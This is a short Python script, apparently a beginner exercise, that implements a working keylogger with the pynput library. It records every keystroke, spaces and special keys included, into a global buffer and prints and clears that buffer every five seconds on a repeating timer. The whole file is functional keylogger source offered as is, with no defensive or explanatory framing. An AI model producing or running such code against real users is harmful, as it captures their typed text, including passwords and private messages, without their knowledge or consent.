import pynput.keyboard
import threading

log = ""


def process_key(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError as e:
        # print(f"{e}: {key}")
        if str(key) == "Key.space":
            log = log + " "
        else:
            log = log + " " + str(key) + " "
    # print(log)


def report(): 
    global log
    print(log)
    log = " "
    timer = threading.Timer(5, report)
    timer.start()


keyword_listner = pynput.keyboard.Listener(on_press=process_key)

with keyword_listner:
    report()
    keyword_listner.join()
